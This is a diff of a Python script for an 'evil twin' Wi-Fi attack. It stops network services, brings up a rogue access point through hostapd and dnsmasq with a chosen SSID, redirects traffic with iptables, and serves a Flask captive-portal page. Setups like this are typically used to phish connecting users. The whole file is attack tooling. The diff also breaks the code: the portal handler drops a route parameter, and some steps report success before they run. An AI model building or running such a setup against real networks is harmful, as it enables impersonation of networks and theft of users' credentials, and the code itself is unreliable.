@@ -1,8 +1,8 @@
 #IMPORTS 
-#test PYTHONPATH=. python modes/evil_twin/evil_twin.py
+#test - sudo PYTHONPATH=. python Modes/EvilTwin/evil_twin.py
 import textwrap
 import os 
-import time 
+import time
 import sys
 import subprocess
 import threading
@@ -25,12 +25,10 @@ PORTAL_IP = "192.168.4.1"
 WIFI_SSID = selected_options["SSID"]
 
 
-#Step 1 stop all services
+#Step 1 stop all services     
 def stoping_services():
-    print("Stoping all services...")
-    cmd(["systemctl", "stop", "wpa_supplicant"], ignore_error=True)
-    cmd(["systemctl", "disable", "wpa_supplicant"], ignore_error=True) # to turn off wpa_suplicatnt
-    cmd(["systemctl", "stop", "NetworkManager"], ignore_error=True)
+    print("Stoping  NetworkManager for the interface, hostapd and dnsmasq services...")
+    cmd(["nmcli", "device", "set", IFACE, "managed", "no"], ignore_error=True) # Disable NetworkManager for the interface
     cmd(["systemctl", "stop", "hostapd"], ignore_error=True)
     cmd(["systemctl", "stop", "dnsmasq"], ignore_error=True)
     print("Step 1 DONE... all services where stoped")
@@ -38,7 +36,7 @@ def stoping_services():
 
 # Step 2 configuring interfaces
 def configuring_interfaces():
-     print("Configureting intarfeces")
+     print("Configureting intarfeces..")
      cmd (["ip", "link", "set", IFACE, "up"], ignore_error=True) # Turn on InterFace
      cmd (["ip", "addr", "flush", "dev", IFACE], ignore_error=True) # Flush InterFace
      cmd(["ip", "addr", "add", f"{PORTAL_IP}/24", "dev", IFACE], ignore_error=True) # to add IP to InterFace
@@ -58,6 +56,7 @@ config_hostapd = textwrap.dedent (f"""\
 """)
 
 def configurating_hostapd():
+     print("Step 3 DONE ... Configuring HOSTAPD was successful")
      os.makedirs("/etc/hostapd", exist_ok=True)
      with open("/etc/hostapd/hostapd.conf", "w") as f:
           f.write(config_hostapd)
@@ -73,6 +72,7 @@ config_dnsmasq = textwrap.dedent(f"""\
  """)
 
 def configurating_dnsmasq():
+     print("Step 4 DONE ... Configuring DNSMASQ was successful")
      with open("/etc/dnsmasq.conf", "w") as f:
           f.write(config_dnsmasq)
 
@@ -87,7 +87,7 @@ def starting_services():
      time.sleep(2)
      cmd(["systemctl", "start", "dnsmasq"])
 
-     print("All services are running DNSMASQ ... ON HOSTAPD... ON")
+     print("Step 5 DONE services are running DNSMASQ ON HOSTAPD ON")
 #100% works 
 
 def setup_iptables():
@@ -108,7 +108,7 @@ app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
 
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>")
-def captive_portal(path):
+def captive_portal():
     return render_template(preset["PORTAL"])
 
 def start_portal():
@@ -117,12 +117,12 @@ def start_portal():
 
 
 def main():
-    #stoping_services()
+    stoping_services()
     configuring_interfaces()
     starting_services()
     setup_iptables()
     print("Starting Evil_Twin.py Portal")
-    start_portal()
+    start_portal()  
 
 if __name__ == "__main__":
     main()
